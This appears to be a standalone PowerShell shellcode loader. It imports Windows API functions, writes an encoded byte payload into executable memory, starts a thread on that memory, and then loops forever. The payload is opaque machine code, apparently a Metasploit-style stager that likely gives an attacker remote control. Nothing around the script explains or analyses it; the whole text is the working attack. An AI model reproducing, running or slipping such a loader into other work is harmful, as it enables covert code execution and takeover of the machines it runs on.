
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbe,0x48,0x31,0xb6,0xc8,0xda,0xcb,0xd9,0x74,0x24,0xf4,0x5f,0x29,0xc9,0xb1,0x47,0x31,0x77,0x13,0x83,0xc7,0x04,0x03,0x77,0x47,0xd3,0x43,0x34,0xbf,0x91,0xac,0xc5,0x3f,0xf6,0x25,0x20,0x0e,0x36,0x51,0x20,0x20,0x86,0x11,0x64,0xcc,0x6d,0x77,0x9d,0x47,0x03,0x50,0x92,0xe0,0xae,0x86,0x9d,0xf1,0x83,0xfb,0xbc,0x71,0xde,0x2f,0x1f,0x48,0x11,0x22,0x5e,0x8d,0x4c,0xcf,0x32,0x46,0x1a,0x62,0xa3,0xe3,0x56,0xbf,0x48,0xbf,0x77,0xc7,0xad,0x77,0x79,0xe6,0x63,0x0c,0x20,0x28,0x85,0xc1,0x58,0x61,0x9d,0x06,0x64,0x3b,0x16,0xfc,0x12,0xba,0xfe,0xcd,0xdb,0x11,0x3f,0xe2,0x29,0x6b,0x07,0xc4,0xd1,0x1e,0x71,0x37,0x6f,0x19,0x46,0x4a,0xab,0xac,0x5d,0xec,0x38,0x16,0xba,0x0d,0xec,0xc1,0x49,0x01,0x59,0x85,0x16,0x05,0x5c,0x4a,0x2d,0x31,0xd5,0x6d,0xe2,0xb0,0xad,0x49,0x26,0x99,0x76,0xf3,0x7f,0x47,0xd8,0x0c,0x9f,0x28,0x85,0xa8,0xeb,0xc4,0xd2,0xc0,0xb1,0x80,0x17,0xe9,0x49,0x50,0x30,0x7a,0x39,0x62,0x9f,0xd0,0xd5,0xce,0x68,0xff,0x22,0x31,0x43,0x47,0xbc,0xcc,0x6c,0xb8,0x94,0x0a,0x38,0xe8,0x8e,0xbb,0x41,0x63,0x4f,0x44,0x94,0x1e,0x4a,0xd2,0x50,0x61,0xb0,0x45,0x37,0x9f,0x39,0x96,0x57,0x16,0xdf,0xf8,0x07,0x79,0x70,0xb8,0xf7,0x39,0x20,0x50,0x12,0xb6,0x1f,0x40,0x1d,0x1c,0x08,0xea,0xf2,0xc9,0x60,0x82,0x6b,0x50,0xfa,0x33,0x73,0x4e,0x86,0x73,0xff,0x7d,0x76,0x3d,0x08,0x0b,0x64,0xa9,0xf8,0x46,0xd6,0x7f,0x06,0x7d,0x7d,0x7f,0x92,0x7a,0xd4,0x28,0x0a,0x81,0x01,0x1e,0x95,0x7a,0x64,0x15,0x1c,0xef,0xc7,0x41,0x61,0xff,0xc7,0x91,0x37,0x95,0xc7,0xf9,0xef,0xcd,0x9b,0x1c,0xf0,0xdb,0x8f,0x8d,0x65,0xe4,0xf9,0x62,0x2d,0x8c,0x07,0x5d,0x19,0x13,0xf7,0x88,0x9b,0x6f,0x2e,0xf4,0xe9,0x81,0xf2;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

